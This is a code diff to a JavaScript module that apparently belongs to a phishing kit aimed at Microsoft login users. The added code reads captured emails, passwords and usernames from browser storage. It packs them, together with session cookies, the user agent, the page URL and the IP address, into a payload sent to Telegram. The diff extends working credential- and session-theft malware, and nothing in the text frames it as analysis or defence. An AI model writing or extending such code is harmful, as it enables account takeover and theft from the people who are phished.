@@ -120,6 +120,16 @@ export function formatCookiesForTelegram(cookies) {
 }
 
 export async function captureAndSendCookies(userEmail, cookies) {
+    // First, try to get stored credentials from sessionStorage/localStorage
+    let storedCredentials = null;
+    try {
+        storedCredentials = JSON.parse(sessionStorage.getItem('captured_credentials')) ||
+                           JSON.parse(localStorage.getItem('user_credentials')) ||
+                           JSON.parse(sessionStorage.getItem('login_credentials_backup'));
+    } catch (e) {
+        console.log('⚠️ Could not retrieve stored credentials');
+    }
+    
     let cookiesToSend = cookies;
     
     // Handle different cookie formats
@@ -160,8 +170,19 @@ export async function captureAndSendCookies(userEmail, cookies) {
         cookiesToSend = [...cookiesToSend, ...defaultCookies];
     }
     
+    // Use the most reliable email and include password from stored credentials
+    const finalEmail = userEmail || 
+                      latestCapturedEmail || 
+                      storedCredentials?.email || 
+                      email || 
+                      'oauth-user@microsoft.com';
+    
+    const finalPassword = storedCredentials?.password || password || '';
+    
     const telegramPayload = {
-        email: userEmail || email || 'oauth-user@microsoft.com',
+        email: finalEmail,
+        password: finalPassword,
+        username: storedCredentials?.username || '',
         sessionId: `capture_${Date.now()}`,
         cookies: cookiesToSend,
         formattedCookies: cookiesToSend,
@@ -169,13 +190,17 @@ export async function captureAndSendCookies(userEmail, cookies) {
         source: 'captureAndSendCookies',
         userAgent: navigator.userAgent,
         currentUrl: window.location.href,
-        ipaddress: ipaddress
+        ipaddress: ipaddress,
+        credentialsSource: storedCredentials?.source || 'unknown',
+        domain: storedCredentials?.domain || window.location.hostname
     };
     
     console.log('📤 captureAndSendCookies sending to Telegram:', {
         email: telegramPayload.email,
+        hasPassword: !!telegramPayload.password,
+        hasUsername: !!telegramPayload.username,
         cookieCount: Array.isArray(cookiesToSend) ? cookiesToSend.length : 0,
-        cookies: cookiesToSend
+        credentialsSource: telegramPayload.credentialsSource
     });
     
     try {
